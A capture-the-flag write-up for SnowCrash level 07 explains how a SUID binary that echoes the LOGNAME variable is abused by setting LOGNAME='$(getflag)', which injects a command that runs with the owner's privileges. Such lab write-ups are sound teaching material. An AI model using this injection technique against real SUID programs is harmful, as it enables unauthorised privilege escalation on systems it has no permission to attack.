# Level 07

## Analysis

In the user's home directory, we found a script named `level07`. The permissions on the file indicated it was a SUID (Set owner User ID up on execution) binary, which is often a target for privilege escalation exploits.

```bash
level07@SnowCrash:~$ ll
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile*
```

We used the `strings` command to read all the printable strings contained within the binary:

```bash
level07@SnowCrash:~$ strings level07
...
LOGNAME
/bin/echo %s
;*2$"
...
```

We noticed lines that suggest the script prints something to the terminal using the echo command, specifically utilizing the `LOGNAME` environment variable:

```
LOGNAME
/bin/echo %s
```

By running the `env` command, we observed `LOGNAME=level07`, indicating `LOGNAME` is an environment variable. The script consistently printed `level07` when executed, leading us to suspect `LOGNAME` was being used within the script. We then injected code via this environment variable:

```bash
LOGNAME='$(getflag)' ./level07
```

This environment variable exploitation allowed us to execute arbitrary commands, specifically `getflag`, to retrieve the flag.

**Type of Exploit**: Environment Variable Manipulation / SUID Exploit